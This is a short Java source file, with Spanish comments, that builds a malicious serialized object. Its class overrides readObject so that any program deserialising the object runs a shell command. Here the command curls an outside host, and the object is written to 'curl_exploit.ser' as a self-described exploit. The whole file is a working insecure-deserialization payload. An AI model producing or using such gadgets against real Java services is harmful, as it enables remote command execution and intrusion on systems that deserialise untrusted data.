import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.ObjectOutputStream;
import java.io.ObjectInputStream;
import java.io.FileOutputStream;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.Serializable;


public class ShellSession implements Serializable {
    private static final long serialVersionUID = 1L;

    private String[] command;

    public ShellSession(String[] command) {
        this.command = command;
    }

    // Sobrescribir el método readObject para ejecutar el comando al deserializarse
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        try {
            System.out.println("Ejecutando el comando: " + String.join(" ", command));
            Process process = Runtime.getRuntime().exec(command);

            // Leer e imprimir la salida del comando
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }

            // Leer e imprimir el error del comando (si hay)
            BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
            while ((line = errorReader.readLine()) != null) {
                System.err.println(line);
            }

        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    // Método para serializar el objeto
    private void writeObject(ObjectOutputStream out) throws IOException {
        out.defaultWriteObject();
    }

    public static void main(String[] args) {
        // Comando a ejecutar como un arreglo de Strings
        String[] command = {"/bin/bash", "-c", "curl www.sapo.shk0x.net"};

        // Crear el objeto CurlExploit con el comando especificado
        ShellSession exploit = new ShellSession(command);

        // Serializar y deserializar para probar la ejecución
        System.out.println("Serializando el objeto...");
        serialize(exploit);

        System.out.println("Deserializando el objeto...");
        deserialize();
    }

    // Serializar el objeto a un archivo llamado "curl_exploit.ser"
    public static void serialize(Object obj) {
        try {
            ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream("curl_exploit.ser"));
            os.writeObject(obj);
            os.close();
            System.out.println("Objeto serializado correctamente en curl_exploit.ser");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    // Deserializar el objeto desde el archivo "curl_exploit.ser"
    public static void deserialize() {
        try {
            ObjectInputStream is = new ObjectInputStream(new FileInputStream("curl_exploit.ser"));
            is.readObject();
            System.out.println("Objeto deserializado correctamente desde curl_exploit.ser");
            is.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
